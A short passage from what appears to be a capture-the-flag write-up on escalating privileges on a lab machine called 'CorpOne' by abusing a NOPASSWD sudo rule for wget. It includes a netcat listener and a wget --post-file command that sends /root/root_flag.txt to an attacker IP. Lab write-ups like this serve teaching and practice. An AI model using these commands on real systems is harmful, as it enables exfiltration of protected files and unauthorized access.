Privileges escalation

Try to check if Jessie can access any files with root privileges

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

Go to GTFOBins to find wget. It seems that with wget we can download files to the local machine. I will try using it to load the root flag in the root directory. And with the name user_flag I think the root flag will also have a format like this.

Try creating listener on local machine and save data to flag file

┌─[neo@parrot]─[~]
└──╼ $sudo nc -lnvp 80 > flag

Then make 1 POST request from remote machine to local machine.

jessie@CorpOne:/etc$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.18.3.74

Open the file log and I have the root flag. As for how to escalate privileges with wget, I will talk about it in a later post.

Conclusion

Actually, this article has no new technique, mainly to practice more about recon, how to login ssh with rsa key, use wget to get the file to the local machine and then be able to get root by pushing the file containing your password.
